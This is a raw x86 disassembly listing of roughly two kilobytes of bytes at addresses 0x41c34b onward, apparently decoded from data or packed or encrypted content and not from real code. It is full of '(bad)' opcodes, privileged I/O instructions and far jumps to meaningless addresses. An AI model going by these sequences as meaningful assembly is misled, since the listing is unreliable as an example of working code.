  41c34b:	fmul   DWORD PTR [esp+edi*1+0x28]
  41c34f:	lock inc eax
  41c351:	into   
  41c352:	ds leave 
  41c354:	in     al,dx
  41c355:	adc    BYTE PTR [ebx-0x1a],0xfe
  41c359:	je     0x41c3b4
  41c35b:	fisubr WORD PTR [ecx]
  41c35d:	sub    DWORD PTR [esp+esi*8],0x52a45acc
  41c364:	in     al,0x7c
  41c366:	push   esi
  41c367:	gs xchg ecx,eax
  41c369:	repnz xchg ecx,eax
  41c36b:	jp     0x41c3b0
  41c36d:	pop    eax
  41c36e:	in     al,0xa3
  41c370:	loop   0x41c37a
  41c372:	jle    0x41c3ba
  41c374:	leave  
  41c375:	or     DWORD PTR [edx],esp
  41c377:	enter  0xccbc,0x27
  41c37b:	pop    esp
  41c37c:	fidivr DWORD PTR [eax]
  41c37e:	inc    ah
  41c380:	call   0x196d:0x170fc5ed
  41c387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c388:	fwait
  41c389:	outs   dx,DWORD PTR ds:[esi]
  41c38a:	int    0xe4
  41c38c:	popf   
  41c38d:	and    esi,esp
  41c38f:	xor    al,BYTE PTR [edi-0x18a4b4c0]
  41c395:	jl     0x41c3ce
  41c397:	sbb    esp,esi
  41c399:	ja     0x41c3cc
  41c39b:	ror    BYTE PTR [ebp+0x501c224c],0x3
  41c3a2:	mov    bh,0xcd
  41c3a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3a5:	daa    
  41c3a6:	inc    edi
  41c3a7:	sbb    ah,BYTE PTR [edx-0x63]
  41c3aa:	mov    ds:0x1fd1a7e5,al
  41c3af:	fwait
  41c3b0:	mov    edi,ss
  41c3b2:	push   edx
  41c3b3:	dec    eax
  41c3b4:	cmp    DWORD PTR [edi],edx
  41c3b6:	lea    ecx,[ebp*2-0x39e99d52]
  41c3bd:	and    ecx,DWORD PTR [ebp-0x12185bd6]
  41c3c3:	scas   al,BYTE PTR es:[edi]
  41c3c4:	iret   
  41c3c5:	fistp  WORD PTR [ebx-0x68]
  41c3c8:	add    ch,bl
  41c3ca:	mov    edi,DWORD PTR cs:[eax+0x6a3f61fd]
  41c3d1:	jmp    0x76b0:0xed58703c
  41c3d8:	jne    0x41c43c
  41c3da:	(bad)  [ecx]
  41c3dc:	repnz outs dx,DWORD PTR ds:[esi]
  41c3de:	add    edx,DWORD PTR [ebx+edi*4]
  41c3e1:	sub    al,0x83
  41c3e3:	inc    edx
  41c3e4:	iret   
  41c3e5:	js     0x41c395
  41c3e7:	mov    ebx,0x788c7191
  41c3ec:	int3   
  41c3ed:	sbb    bl,BYTE PTR [ebx+0x52]
  41c3f0:	sbb    al,0x74
  41c3f2:	jo     0x41c3c3
  41c3f4:	push   ss
  41c3f5:	cld    
  41c3f6:	scas   eax,DWORD PTR es:[edi]
  41c3f7:	call   0x818d:0x541ec371
  41c3fe:	add    esi,edi
  41c400:	inc    esi
  41c401:	mov    cl,0xee
  41c403:	dec    esi
  41c404:	pusha  
  41c405:	xchg   esi,eax
  41c406:	mov    cl,0x39
  41c408:	rcl    BYTE PTR [ebp+0x39],cl
  41c40b:	sub    al,ch
  41c40d:	pop    es
  41c40e:	and    al,0x4e
  41c410:	push   ds
  41c411:	xor    DWORD PTR [ecx],0xa5693805
  41c417:	mov    ebp,0x1c3a9e9e
  41c41c:	int3   
  41c41d:	xchg   DWORD PTR [ebp-0x6a4fe31b],ebx
  41c423:	cmp    BYTE PTR [ebx],al
  41c425:	out    dx,al
  41c426:	mov    ch,0xf7
  41c428:	cmovbe ebx,DWORD PTR [ebx]
  41c42b:	cmp    eax,0xd824e537
  41c430:	sbb    eax,0x88cecb97
  41c435:	add    BYTE PTR [eax-0x7e],bh
  41c438:	pop    ebx
  41c439:	repnz int 0x31
  41c43c:	add    bh,al
  41c43e:	sub    eax,0x3adf66fa
  41c443:	xchg   ebx,eax
  41c444:	cs cmc 
  41c446:	adc    DWORD PTR [bx-0x44],0xfffffff7
  41c44b:	sbb    esi,DWORD PTR [ebx+0x18]
  41c44e:	fs test al,0x8a
  41c451:	repz pop esp
  41c453:	mov    bl,0x8a
  41c455:	sbb    edx,esi
  41c457:	add    eax,DWORD PTR [ebx+0x30]
  41c45a:	imul   esi,ebp,0xffffffae
  41c45d:	add    bl,bl
  41c45f:	mov    esp,0x2fecd692
  41c464:	call   0xbaa793ea
  41c469:	push   esp
  41c46a:	jl     0x41c43b
  41c46c:	rol    DWORD PTR [ecx+0x1c9f4ca8],0xed
  41c473:	mov    ds:0x3e5cbd47,eax
  41c478:	jg     0x41c43d
  41c47a:	or     BYTE PTR [eax],bh
  41c47c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c47d:	mov    bl,0xeb
  41c47f:	cld    
  41c480:	add    ecx,DWORD PTR [ebx-0x6b350ac2]
  41c486:	out    0xda,al
  41c488:	pop    ebp
  41c489:	shl    DWORD PTR [edi+0x4a],0x5d
  41c48d:	dec    DWORD PTR [ecx]
  41c48f:	fiadd  WORD PTR [edx+edi*2]
  41c492:	mov    ?,WORD PTR [edx+0x7d2a1981]
  41c498:	mov    al,ds:0x845b811d
  41c49d:	clc    
  41c49e:	es mov dl,0xb5
  41c4a1:	mov    ds:0x155d36d8,al
  41c4a6:	dec    ecx
  41c4a7:	or     eax,0xbe314c71
  41c4ac:	adc    DWORD PTR ds:0xdcf2a19b,eax
  41c4b2:	adc    eax,0x409e4d72
  41c4b7:	pop    edi
  41c4b8:	pop    eax
  41c4b9:	frstor [esi-0x7b]
  41c4bc:	push   esi
  41c4bd:	inc    ebp
  41c4be:	pop    esp
  41c4bf:	popf   
  41c4c0:	xchg   esi,eax
  41c4c1:	xchg   esp,eax
  41c4c2:	push   eax
  41c4c3:	cwde   
  41c4c4:	dec    ebx
  41c4c5:	adc    BYTE PTR [edx+esi*4+0x597274af],ch
  41c4cc:	mov    bl,0x4
  41c4ce:	push   0xffffffbd
  41c4d0:	(bad)  
  41c4d1:	push   eax
  41c4d2:	dec    edx
  41c4d3:	and    eax,0x230a538c
  41c4d8:	call   0xcc7942ac
  41c4dd:	sbb    eax,0xbeda548b
  41c4e2:	arpl   WORD PTR [esi],di
  41c4e4:	mov    dl,0x49
  41c4e6:	scas   eax,DWORD PTR es:[edi]
  41c4e7:	retf   0x565b
  41c4ea:	xor    bh,bh
  41c4ec:	lods   eax,DWORD PTR gs:[esi]
  41c4ee:	cmp    BYTE PTR [esi+0x2e1c75a5],bl
  41c4f4:	or     BYTE PTR [edx],bl
  41c4f6:	fisubr WORD PTR [esi]
  41c4f8:	mov    edi,0xcb5fe3ec
  41c4fd:	jbe    0x6ae5e75b
  41c503:	test   eax,0x649c8b44
  41c508:	xor    al,0xc6
  41c50a:	fild   WORD PTR [eax-0x4f]
  41c50d:	or     BYTE PTR [eax+0x2e73d543],0x15
  41c514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c515:	hlt    
  41c516:	fld    DWORD PTR [esi]
  41c518:	add    DWORD PTR [ebp-0x63bb388f],eax
  41c51e:	sti    
  41c51f:	lea    ecx,[edx-0x6b]
  41c522:	adc    eax,0x9201231b
  41c527:	and    bh,BYTE PTR [eax-0x5bcf4665]
  41c52d:	stos   BYTE PTR es:[edi],al
  41c52e:	lods   al,BYTE PTR ds:[esi]
  41c52f:	ins    BYTE PTR es:[edi],dx
  41c530:	add    al,0xdb
  41c532:	mov    ebx,DWORD PTR [edx+0x7c]
  41c535:	sub    edx,esi
  41c537:	imul   ecx,DWORD PTR [edi-0x536b1230],0x6f
  41c53e:	mov    WORD PTR [edi+0x1f5af3ff],ss
  41c544:	inc    edi
  41c545:	sub    eax,0x71b9b06e
  41c54a:	stos   BYTE PTR es:[edi],al
  41c54b:	(bad)  
  41c54c:	nop
  41c54d:	lea    ecx,[ecx+0x25ee226f]
  41c553:	int    0x89
  41c555:	jg     0x41c50a
  41c557:	xor    al,cl
  41c559:	addr16 add al,0xd6
  41c55c:	dec    DWORD PTR [eax-0x2a]
  41c55f:	push   edx
  41c560:	mov    cl,0x62
  41c562:	lods   al,BYTE PTR ds:[esi]
  41c563:	jmp    0x41c523
  41c565:	sbb    dl,0xc4
  41c568:	imul   esp,DWORD PTR [ebx],0x63
  41c56b:	or     esi,ebp
  41c56d:	or     BYTE PTR ds:[eax],ah
  41c570:	into   
  41c571:	mov    al,0xd9
  41c573:	dec    edi
  41c574:	xchg   esi,eax
  41c575:	adc    al,0x58
  41c577:	sbb    DWORD PTR [edx+esi*1+0x18455742],edx
  41c57e:	fwait
  41c57f:	dec    esp
  41c580:	jns    0x41c54f
  41c582:	scas   eax,DWORD PTR es:[edi]
  41c583:	mov    dl,0xe2
  41c585:	mov    edx,0x63a9d4cd
  41c58a:	mov    DWORD PTR [ebx],ecx
  41c58c:	fdivr  st,st(1)
  41c58e:	push   edi
  41c58f:	in     eax,0x10
  41c591:	jle    0x41c5b0
  41c593:	out    0x7a,al
  41c595:	add    eax,0xe5e6ab57
  41c59a:	call   0x684d31ae
  41c59f:	pop    ss
  41c5a0:	rcr    DWORD PTR [ebx],cl
  41c5a2:	jmp    0x41c5ad
  41c5a4:	cld    
  41c5a5:	cdq    
  41c5a6:	adc    bh,BYTE PTR [eax+edi*1+0x58459ba3]
  41c5ad:	(bad)  
  41c5af:	cmp    dl,BYTE PTR [edi+0x53]
  41c5b2:	adc    al,0x3a
  41c5b4:	cs sub al,0x6
  41c5b7:	test   eax,0x6b1c3fd7
  41c5bc:	mov    ds:0xa27c3a60,eax
  41c5c1:	jne    0x41c5b0
  41c5c3:	jns    0x41c63f
  41c5c5:	enter  0x8da8,0x6b
  41c5c9:	jmp    0x7969:0x1b1e3472
  41c5d0:	sbb    dl,BYTE PTR [eax-0x76]
  41c5d3:	cld    
  41c5d4:	aas    
  41c5d5:	inc    esp
  41c5d6:	std    
  41c5d7:	mov    bl,0x19
  41c5d9:	nop
  41c5da:	mov    DWORD PTR [ebx-0x52930d7e],ebp
  41c5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5e1:	pop    ebp
  41c5e2:	dec    eax
  41c5e3:	jl     0x41c592
  41c5e5:	outs   dx,DWORD PTR ds:[esi]
  41c5e6:	cmc    
  41c5e7:	mov    DWORD PTR [edx],0x7e30640b
  41c5ed:	push   esp
  41c5ee:	cmovg  ecx,DWORD PTR [ebp-0x586498f3]
  41c5f5:	sub    cl,cl
  41c5f7:	bound  ecx,QWORD PTR [edx]
  41c5f9:	cmp    eax,0x528a4aed
  41c5fe:	jnp    0x41c589
  41c600:	repz lea ebx,[ecx-0x28bca2ef]
  41c607:	or     eax,0xebe07046
  41c60c:	and    edx,DWORD PTR [ecx+ebp*4+0x78]
  41c610:	enter  0xcfd6,0xf0
  41c614:	xor    WORD PTR [ecx+0x21],dx
  41c618:	push   ebx
  41c619:	push   esp
  41c61a:	jmp    0x6a62294f
  41c61f:	adc    esi,DWORD PTR [edi-0x7e]
  41c622:	sbb    bl,BYTE PTR [ebx]
  41c624:	mov    cl,0x26
  41c626:	fisttp QWORD PTR [eax]
  41c628:	stos   DWORD PTR es:[edi],eax
  41c629:	xor    esp,edi
  41c62b:	(bad)  
  41c62c:	fs ss dec ebx
  41c62f:	add    dh,BYTE PTR [edx-0x47]
  41c632:	mov    bl,0x25
  41c634:	inc    edx
  41c635:	out    0xd9,eax
  41c637:	cmp    ecx,DWORD PTR [eax-0x66b357ec]
  41c63d:	push   ss
  41c63e:	pop    ebp
  41c63f:	mov    esi,0x4e20425f
  41c644:	mov    WORD PTR [edx+eax*1-0xaa9b552],?
  41c64b:	xor    ebx,DWORD PTR [eax-0x5854c99a]
  41c651:	enter  0x3850,0x26
  41c655:	push   0x67fbde93
  41c65a:	sub    DWORD PTR [eax-0x369044d2],eax
  41c660:	mov    al,ds:0x58f77822
  41c665:	jne    0x41c683
  41c667:	jmp    0x3b0dc413
  41c66c:	or     dl,BYTE PTR [edi-0x4db6b2e4]
  41c672:	adc    eax,0x50218b93
  41c677:	mov    BYTE PTR [edx+0x51dbd4f6],cl
  41c67d:	dec    ebp
  41c67e:	sar    ebx,0x9d
  41c681:	lea    eax,[edx-0xb57559b]
  41c687:	(bad)  
  41c688:	xchg   edi,eax
  41c689:	jp     0x41c6da
  41c68b:	dec    ebx
  41c68c:	sub    ecx,DWORD PTR [ecx+0x6b]
  41c68f:	fdiv   QWORD PTR [eax+0x35]
  41c692:	mov    ecx,0xf3949f2c
  41c697:	(bad)  
  41c698:	imul   esi,DWORD PTR [eax],0x3d6ee59e
  41c69e:	sbb    edi,eax
  41c6a0:	pop    es
  41c6a1:	jmp    0x41c6df
  41c6a3:	add    BYTE PTR [esi-0xd],0x39
  41c6a7:	inc    ebx
  41c6a8:	fst    DWORD PTR [edx]
  41c6aa:	out    0xd6,al
  41c6ac:	or     ebx,DWORD PTR [edi+0x845996d]
  41c6b2:	push   cs
  41c6b3:	and    eax,esi
  41c6b5:	fnclex 
  41c6b7:	(bad)  
  41c6b8:	push   edi
  41c6b9:	and    eax,0x44a5e28e
  41c6be:	cwde   
  41c6bf:	xor    esi,edx
  41c6c1:	in     eax,0xa8
  41c6c3:	mov    ah,0xef
  41c6c5:	xor    al,0x19
  41c6c7:	imul   esi,eax,0xab9241f
  41c6cd:	popa   
  41c6ce:	jae    0x41c719
  41c6d0:	mov    edi,0x8121fe6d
  41c6d5:	(bad)  
  41c6d6:	pop    ebp
  41c6d7:	ficom  DWORD PTR [ecx]
  41c6d9:	ret    0x97b
  41c6dc:	inc    eax
  41c6dd:	shl    ebx,1
  41c6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6e0:	pop    ecx
  41c6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e2:	clc    
  41c6e3:	das    
  41c6e4:	xor    DWORD PTR [edx-0x656b9f52],edi
  41c6ea:	sahf   
  41c6eb:	loopne 0x41c748
  41c6ed:	mov    ds:0x7e559baa,eax
  41c6f2:	pop    ebp
  41c6f3:	jns    0x41c70c
  41c6f5:	adc    eax,0xb567f7a
  41c6fa:	adc    edx,DWORD PTR [ebp-0x6f]
  41c6fd:	daa    
  41c6fe:	sub    BYTE PTR [ebx+0x720d426f],0xe8
  41c705:	mov    ebx,0x6954a018
  41c70a:	jmp    0xa739b55f
  41c70f:	leave  
  41c710:	nop
  41c711:	ins    DWORD PTR es:[edi],dx
  41c712:	sbb    al,0x11
  41c714:	mov    eax,ds:0x6caffc18
  41c719:	into   
  41c71a:	ins    BYTE PTR es:[edi],dx
  41c71b:	inc    edi
  41c71c:	(bad)  
  41c71d:	idiv   DWORD PTR [ebx]
  41c71f:	push   ss
  41c720:	sbb    BYTE PTR [esi],0xc
  41c723:	bound  ebp,QWORD PTR [eax-0x7a]
  41c726:	outs   dx,DWORD PTR ds:[esi]
  41c727:	jns    0x41c6cd
  41c729:	push   ds
  41c72a:	cmp    bl,cl
  41c72c:	retf   
  41c72d:	push   ds
  41c72e:	iret   
  41c72f:	xor    al,0x30
  41c731:	mov    eax,fs:0xaf10be34
  41c737:	xchg   dh,dh
  41c739:	mov    ebx,0x8d2b444b
  41c73e:	addr16 mov bh,0xf8
  41c741:	jge    0x41c7bc
  41c743:	add    BYTE PTR [edx-0x62c20c4e],dh
  41c749:	sbb    al,0xd5
  41c74b:	fucomp st(4)
  41c74d:	or     ecx,DWORD PTR [edi]
  41c74f:	(bad)  
  41c750:	shl    DWORD PTR [esi],1
  41c752:	sti    
  41c753:	loopne 0x41c6ea
  41c755:	adc    eax,DWORD PTR [ecx-0x5f]
  41c758:	mov    bl,0xc2
  41c75a:	mov    BYTE PTR ds:0xb2e1bff2,ah
  41c760:	lea    ebp,[esi]
  41c762:	lock dec ebp
  41c764:	call   0xc323:0x35c95ea
  41c76b:	je     0x41c7e7
  41c76d:	idiv   BYTE PTR [ebx]
  41c76f:	cmp    esp,DWORD PTR [edi+0x4dff7e8f]
  41c775:	sahf   
  41c776:	retf   
  41c777:	and    eax,0x192b1942
  41c77c:	fmul   QWORD PTR [edx]
  41c77e:	mov    bh,0x1a
  41c780:	cmp    BYTE PTR [eax+0x47],bl
  41c783:	and    al,0x83
  41c785:	sbb    esp,DWORD PTR es:[esi-0x692f827]
  41c78c:	loope  0x41c792
  41c78e:	push   ds
  41c78f:	loopne 0x41c80f
  41c791:	sbb    ecx,ecx
  41c793:	test   al,0xda
  41c795:	sbb    eax,DWORD PTR [eax+0x2a]
  41c798:	daa    
  41c799:	push   es
  41c79a:	sbb    ch,ah
  41c79c:	push   ebx
  41c79d:	out    0xb2,eax
  41c79f:	add    BYTE PTR [ecx+0x4a903923],dl
  41c7a5:	ss test eax,0x801d367e
  41c7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7ac:	mov    cl,0xba
  41c7ae:	(bad)  
  41c7af:	les    ecx,FWORD PTR [ecx+0x2b]
  41c7b2:	mov    ds:0xeb949ec7,eax
  41c7b7:	fld    DWORD PTR [ebx]
  41c7b9:	(bad)  
  41c7ba:	repz cmp eax,0x2f04d050
  41c7c0:	pop    edx
  41c7c1:	fld    QWORD PTR [eax]
  41c7c3:	sub    esi,DWORD PTR [edx-0x2c]
  41c7c6:	push   0x5be08b2b
  41c7cb:	cli    
  41c7cc:	test   esi,esi
  41c7ce:	imul   ebp,DWORD PTR [ebp-0x12173a33],0xfffffff3
  41c7d5:	shr    dh,1
  41c7d7:	mov    cl,0x67
  41c7d9:	mov    ds:0x847c81e5,al
  41c7de:	mov    edx,0x6027cd5c
  41c7e3:	test   eax,0xe1e02a69
  41c7e8:	shl    DWORD PTR [ebx-0x75a4f7e6],cl
  41c7ee:	sti    
  41c7ef:	cld    
  41c7f0:	cwde   
  41c7f1:	and    BYTE PTR [eax+0x12],0xb4
  41c7f5:	sub    esp,DWORD PTR [ebp-0x44095f61]
  41c7fb:	push   ebp
  41c7fc:	mov    eax,fs:0xd9b073c7
  41c802:	adc    ebx,esi
  41c804:	rol    BYTE PTR [ebx+0x24],cl
  41c807:	test   al,0xfa
  41c809:	mov    ch,0xb3
  41c80b:	xchg   DWORD PTR [edi+0x36],eax
  41c80e:	push   cs
  41c80f:	test   eax,0x589dc50e
  41c814:	fs mov edi,0x689ac983
  41c81a:	inc    edi
  41c81b:	fidivr WORD PTR [eax]
  41c81d:	ins    BYTE PTR es:[edi],dx
  41c81e:	call   0x269c:0x5f2145a6
  41c825:	rcr    DWORD PTR [ebx+0x418bb401],cl
  41c82b:	loop   0x41c871
  41c82d:	retf   
  41c82e:	mov    DWORD PTR [esi-0x6c],0xefcef685
  41c835:	inc    ebp
  41c836:	sbb    dh,BYTE PTR [edx+edx*1-0xc4b945d]
  41c83d:	stos   DWORD PTR es:[edi],eax
  41c83e:	xchg   BYTE PTR [eax+edi*4],ch
  41c841:	mov    ch,0x36
  41c843:	pop    ebx
  41c844:	pusha  
  41c845:	mov    ds:0x2c809629,al
  41c84a:	cs pop esp
  41c84c:	call   0x83f9:0x7fc5fdf2
  41c853:	fs aaa 
  41c855:	out    dx,al
  41c856:	cmp    DWORD PTR [ebx],0x1c89e2da
  41c85c:	fsubr  QWORD PTR [ebp-0x69]
  41c85f:	fnstcw WORD PTR [ecx+0x73]
  41c862:	call   0x810eba14
  41c867:	mov    bh,0x73
  41c869:	jmp    0x7e4be8f7
  41c86e:	sbb    DWORD PTR [ecx-0x66],esp
  41c871:	shr    DWORD PTR [edi-0x30],0x38
  41c875:	je     0x41c8d5
  41c877:	cmp    eax,0x2e4dd89c
  41c87c:	xor    bl,BYTE PTR [esi]
  41c87e:	pop    esi
  41c87f:	cmp    eax,0x77007c79
  41c884:	mul    DWORD PTR [ebx+0x70beaa80]
  41c88a:	arpl   WORD PTR [esi+0x6b],di
  41c88d:	arpl   WORD PTR [edx+0x3d],bx
  41c890:	retf   0x1b5b
  41c893:	xlat   BYTE PTR ds:[ebx]
  41c894:	loop   0x41c84f
  41c896:	ja     0x41c858
  41c898:	and    DWORD PTR [eax],esi
  41c89a:	jb     0x41c914
  41c89c:	invd   
  41c89e:	jnp    0x41c8ef
  41c8a0:	add    eax,DWORD PTR [eax]
  41c8a2:	out    dx,eax
  41c8a3:	fld    TBYTE PTR [ebp+0x67]
  41c8a6:	aam    0xb8
  41c8a8:	rcr    BYTE PTR [ebx],1
  41c8aa:	pop    esi
  41c8ab:	jg     0x41c8ab
  41c8ad:	sbb    ch,BYTE PTR [eax+0x51a517f8]
  41c8b3:	rol    BYTE PTR [edx-0x12],0x84
  41c8b7:	mov    esp,0x25ce412d
  41c8bc:	sbb    ebx,ebx
  41c8be:	fucom  st(7)
  41c8c0:	jmp    0xfcbbb88
  41c8c5:	xchg   edx,eax
  41c8c6:	sbb    BYTE PTR [edx+0x2e],ah
  41c8c9:	mov    eax,0xa8b107a9
  41c8ce:	aaa    
  41c8cf:	cmp    al,0xf1
  41c8d1:	jbe    0x41c91e
  41c8d3:	cmp    eax,0xfcb85847
  41c8d8:	imul   esp,ecx,0x33
  41c8db:	gs je  0x41c8f0
  41c8de:	les    ecx,FWORD PTR [edi+0x3b]
  41c8e1:	out    0x28,eax
  41c8e3:	not    DWORD PTR [edx]
  41c8e5:	jo     0x41c91c
  41c8e7:	and    DWORD PTR [esi*1+0x75d703bb],edi
  41c8ee:	cmp    esi,ebp
  41c8f0:	adc    DWORD PTR [ecx],edx
  41c8f2:	jae    0x41c918
  41c8f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8f5:	bound  ebx,QWORD PTR [edx]
  41c8f7:	adc    DWORD PTR [esi+ecx*8-0x1c53c971],0x3e
  41c8ff:	das    
  41c900:	mov    ch,0x57
  41c902:	or     eax,0x4b213123
  41c907:	or     al,0xe
  41c909:	je     0x41c93b
  41c90b:	fsubrp st(5),st
  41c90d:	cmp    DWORD PTR [edx-0x51],eax
  41c910:	cmovp  esi,DWORD PTR [ecx+0x10]
  41c914:	sub    DWORD PTR ds:0xdbe0ca29,edx
  41c91a:	adc    eax,0x617bd87
  41c91f:	fild   QWORD PTR [ecx]
  41c921:	add    bl,BYTE PTR [ebx]
  41c923:	push   ebx
  41c924:	into   
  41c925:	fbstp  TBYTE PTR [esi-0x7891400a]
  41c92b:	xor    eax,0xf9b406ac
  41c930:	adc    eax,0xe8bd0120
  41c935:	std    
  41c936:	mov    WORD PTR [eax+ecx*1-0x7cc60288],?
  41c93d:	push   0xd47f7e53
  41c942:	xchg   edx,eax
  41c943:	gs xchg bh,bl
  41c946:	mov    ebx,0x61eb3382
  41c94b:	mov    WORD PTR [esi-0x6bfbf20d],?
  41c951:	xchg   ebx,eax
  41c952:	inc    esp
  41c953:	mov    ebx,0x3a5ed8b4
  41c958:	adc    ch,bl
  41c95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c95b:	fimul  WORD PTR [ecx+0x63]
  41c95e:	(bad)  
  41c95f:	mov    dh,0x52
  41c961:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c963:	push   esi
  41c964:	sub    al,0xbd
  41c966:	adc    bl,cl
  41c968:	push   ecx
  41c969:	out    0x87,al
  41c96b:	sub    bl,BYTE PTR [edi-0xd941982]
  41c971:	ja     0x41c95b
  41c973:	pop    esi
  41c974:	je     0x41c9cb
  41c976:	shl    ebx,cl
  41c978:	ins    BYTE PTR es:[edi],dx
  41c979:	and    BYTE PTR [edi+0x4f],0x2c
  41c97d:	inc    esp
  41c97e:	stc    
  41c97f:	mov    ebx,0x6d3d8d59
  41c984:	rcr    BYTE PTR [ecx-0x2c],cl
  41c987:	loop   0x41c913
  41c989:	mov    ecx,0x82d98cbe
  41c98e:	mov    ds:0x458901c,eax
  41c993:	out    dx,al
  41c994:	rcr    DWORD PTR [edx-0x7e6c656a],0xd9
  41c99b:	cli    
  41c99c:	mul    DWORD PTR [ebx-0x1e]
  41c99f:	pop    edi
  41c9a0:	adc    BYTE PTR [edi-0x63374bc6],bh
  41c9a6:	ret    
  41c9a7:	push   edi
  41c9a8:	aaa    
  41c9a9:	int    0x10
  41c9ab:	(bad)  
  41c9ac:	push   esi
  41c9ad:	mov    ss,WORD PTR ds:0x1962e121
  41c9b3:	xchg   esp,eax
  41c9b4:	sahf   
  41c9b5:	(bad)  
  41c9b6:	mov    al,0x68
  41c9b8:	mov    ds:0x936e1685,eax
  41c9bd:	xor    dl,BYTE PTR [edi-0xe]
  41c9c0:	je     0x41ca27
  41c9c2:	pushf  
  41c9c3:	punpcklbw mm3,mm2
  41c9c6:	push   0xffffffb2
  41c9c8:	mov    al,0x46
  41c9ca:	div    BYTE PTR [eax-0x17d2b96d]
  41c9d0:	rol    BYTE PTR [eax-0x6f800f01],0x7c
  41c9d7:	dec    esi
  41c9d8:	(bad)  [edx]
  41c9da:	mov    bl,0x62
  41c9dc:	mov    dh,0xa
  41c9de:	call   0x6467:0x817463fd
  41c9e5:	or     edx,esp
  41c9e7:	outs   dx,DWORD PTR ds:[esi]
  41c9e8:	mov    ebp,DWORD PTR [ecx-0x7454bb4f]
  41c9ee:	mov    eax,0x878db54e
  41c9f3:	cmp    bl,dl
  41c9f5:	shl    DWORD PTR [ebp-0x76],1
  41c9f8:	into   
  41c9f9:	mov    al,ds:0x9216ce9d
  41c9fe:	cs xchg ebp,eax
  41ca00:	sub    DWORD PTR [ebx+0x24],edi
  41ca03:	aaa    
  41ca04:	and    esp,DWORD PTR [eax+0x774c6576]
  41ca0a:	stos   BYTE PTR es:[edi],al
  41ca0b:	gs and al,0x9f
  41ca0e:	aad    0xf9
  41ca10:	outs   dx,DWORD PTR ds:[esi]
  41ca11:	sub    BYTE PTR [edx+eiz*1-0x5d],0x4b
  41ca16:	inc    ecx
  41ca17:	mov    dh,0xe2
  41ca19:	call   0xd16f:0x3bebd3e9
  41ca20:	jne    0x41c9fe
  41ca22:	fld    st(7)
  41ca24:	adc    eax,0x3bce8abb
  41ca29:	adc    al,0x98
  41ca2b:	lds    edi,FWORD PTR [ebp+0xd]
  41ca2e:	(bad)  
  41ca2f:	(bad)  
  41ca30:	dec    esi
  41ca31:	in     al,0xe5
  41ca33:	adc    edx,DWORD PTR [esi+0x39f2e910]
  41ca39:	xor    eax,0x1b4256e0
  41ca3e:	addr16 aad 0x22
  41ca41:	in     eax,dx
  41ca42:	popa   
  41ca43:	xchg   edx,eax
  41ca44:	jnp    0x41cabf
  41ca46:	mov    DWORD PTR [ebp-0x37c920a3],eax
  41ca4c:	sti    
  41ca4d:	inc    esi
  41ca4e:	jg     0x41c9fa
  41ca50:	xor    eax,0xa2f24fab
  41ca55:	sar    ebx,cl
  41ca57:	jae    0x41ca92
  41ca59:	not    edi
  41ca5b:	mov    DWORD PTR [edx],edi
  41ca5d:	push   edi
  41ca5e:	jo     0x41cacc
  41ca60:	mov    ch,0xcc
  41ca62:	jmp    0xe59a:0x1a83ecb2
  41ca69:	dec    ebp
  41ca6a:	enter  0xd196,0xb9
  41ca6e:	mov    bh,0x7e
  41ca70:	pop    ds
  41ca71:	gs mov ch,0x49
  41ca74:	inc    ecx
  41ca75:	sub    DWORD PTR [esi],ebp
  41ca77:	jg     0x41ca3b
  41ca79:	mov    bl,0x88
  41ca7b:	jg     0x41ca28
  41ca7d:	test   eax,0x8572ab41
  41ca82:	push   ebp
  41ca83:	and    BYTE PTR [eax*1+0x241d4216],cl
  41ca8a:	cmp    eax,0x5f82aa8b
  41ca8f:	retf   0x2da2
  41ca92:	repnz and BYTE PTR [edi],bh
  41ca95:	jg     0x41ca47
  41ca97:	sti    
  41ca98:	loopne 0x41cadc
  41ca9a:	imul   esp,DWORD PTR [ecx+0x2438dc30],0xb55431d
  41caa4:	and    ecx,edi
  41caa6:	mov    dl,0xe3
  41caa8:	jne    0x41ca91
  41caaa:	mov    edx,0x3fb3e337
  41caaf:	jb     0x41cae3
  41cab1:	(bad)  
  41cab2:	jno    0x41cb0b
  41cab4:	das    
  41cab5:	out    dx,eax
  41cab6:	mov    esp,0xed202052
  41cabb:	js     0x41ca96
  41cabd:	push   ecx
  41cabe:	or     eax,0x3788d6e4
  41cac3:	xchg   ebp,eax
  41cac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cac6:	jecxz  0x41caa1
  41cac8:	push   ds
  41cac9:	arpl   ax,si
  41cacb:	scas   ax,WORD PTR es:[edi]
  41cacd:	inc    esp
  41cace:	sbb    eax,0xdd3f9561
  41cad3:	xor    eax,DWORD PTR [esi+eax*2]
  41cad6:	pop    esi
  41cad7:	mov    dl,0xe4
  41cad9:	enter  0x4306,0xca
  41cadd:	sub    eax,0xd258ffa8
  41cae2:	pusha  
  41cae3:	and    edi,DWORD PTR [eax-0xb811ef]
  41cae9:	jmp    0xc4e80ca1
  41caee:	cld    
  41caef:	das    
  41caf0:	push   0x1ff04156
  41caf5:	cmp    esi,0x27e6f17a
  41cafb:	(bad)  
  41cafc:	xor    DWORD PTR [edi-0x4c],esi
  41caff:	fnsave [edi+0x65644abf]
  41cb05:	rcl    BYTE PTR [ecx],1
  41cb07:	sub    DWORD PTR [eax],0x921495b9
  41cb0d:	sti    
  41cb0e:	cmp    eax,0xad47bb8e
  41cb13:	hlt    
  41cb14:	(bad)  
  41cb15:	or     eax,0x9e223a36
  41cb1a:	in     eax,0xaf
  41cb1c:	add    bl,bl
  41cb1e:	jmp    0xa998f6e5
  41cb23:	or     BYTE PTR fs:[ecx-0x39ea3bc9],ah
  41cb2a:	mov    eax,0xfb684289
  41cb2f:	sub    cl,ch
  41cb31:	fdivrp st(5),st
  41cb33:	cmp    DWORD PTR [ebx],edi
  41cb35:	mov    ebx,0xb4ecb9ae
